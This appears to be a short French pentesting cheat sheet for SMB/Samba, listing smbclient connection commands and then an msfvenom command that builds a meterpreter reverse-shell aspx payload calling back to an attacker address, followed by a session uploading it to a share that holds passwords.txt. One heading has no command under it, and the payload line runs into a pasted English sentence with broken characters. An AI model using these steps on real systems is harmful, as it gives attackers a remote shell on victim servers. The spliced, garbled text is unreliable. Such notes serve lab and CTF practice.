# 📂 SMB Samba

Enumerate SMB Samba

Pour se connecter directement essayer ça:

```bash
smbclient -U user \\\\10.10.250.140\\user
```

ou

```bash
smbclient \\\\10.10.x.x\\nt4wrksv
```

ou

```bash
smbclient //10.10.46.10/share anonymous(ou user) -p 445
```

Pour lister les partages SMB :

Au cas où, pour créer un payload aspx et l'envoyer sur le SMB:

```bash
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspxNow, letâ€™s connect to the network share and upload our reverse shell aspx file: 
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (12.9 kb/s) (average 7.9 kb/s)
smb: \> ls
  .                                   D        0  Thu Aug 27 22:48:34 2020
  ..                                  D        0  Thu Aug 27 22:48:34 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  shell.aspx                          A    38409  Thu Aug 27 22:48:37 2020
  test.txt                            A        5  Thu Aug 27 22:42:10 2020
        7735807 blocks of size 4096. 4946700 blocks available
smb: \> 
```
